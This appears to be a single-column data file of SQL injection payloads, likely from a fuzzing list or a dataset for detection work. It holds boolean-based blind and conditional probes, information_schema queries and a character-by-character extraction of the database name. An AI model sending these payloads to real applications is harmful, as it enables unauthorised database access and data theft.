Info
-3136%') or 3400=6002
-9336' or 5641=9488#
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
-3938%'))) or 2034=7209#
"-4954%"") or 5244=4832"
1'))) and 3602=1990#
"1’ AND (select ascii(substr(database(),5,1))=120) --+"
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb
"-3963"" or 1224=5119"
-1354)) or 8571=8571--
"-7324) or make_set(8486=6544,6544)"
1))) and 9198=9198--
"-9313%"") or 5971=4572#"
"-9111"" or 3038=3038"
-5116) or (8287=4930)*4930
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc"
1%') and (7704=3494)*3494 and ('%'='
"-9996' or make_set(1237=7111,7111)"
"-9265"") or 7834=1685"
1') and 5999=5879
"1%"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#"
-9389') or 8859=3989--
1') rlike (select (case when (7447=3981) then 1 else 0x28 end))
"1’ AND (select ascii(substr(database(),1,1))=115) --+"
"1""))) and 2006=2006"
-3520%' or 8571=8571--
"1’ AND (select ascii(substr(database(),2,1))=101) --+"
-5585%'))) or 6990=7727
"1"" and 6637=2321"
"-4072%""))) or 3999=1979"
"-1763%"" or (8459=8459)*4906 and ""%""="""
1)) and 2006=2006
1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'='
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd
1%' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'='
1')) and 3526=1354
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv"
1 and 9198=9198--
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv"
-5134))) or 8571=8571--
1%')) and 7160=7249--
"-6442""))) or 3038=3038"
1')) and 2006=2006
1 and 5934=7745
1'))) and 5934=2309
"1%"")) and 4595=4595#"
"-2067"" or 3038=3038"
"-4945 or make_set(9354=9354,7185)"
-2936) or 6872=6872
1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj
-6433%')) or 9323=9323#
-4023 or (8779=5716)*5716
-8911%' or 9323=9323#
"-2759%"")) or 7769=1249#"
"1’ AND (select ascii(substr(database(),3,1))=114) --+"
"-5630"") or 3038=3038"
"1""))) rlike (select (case when (7975=2446) then 1 else 0x28 end)) and (((""qixm"" like ""qixm"
1%') and 8734=5844
1') and (3020=3020)*6703 and ('lhfa'='lhfa
-7187' or 4159=7465
"-5963"" or 9323=9323#"
-5258) or (8459=8459)*4906
1))) and 9575=1640--
1%' and 9127=7687--
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""="""
"-3436) or elt(1032=1032,3623)"
"1"") and 9198=9198--"
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--"
1' rlike (select (case when (5384=7060) then 1 else 0x28 end))
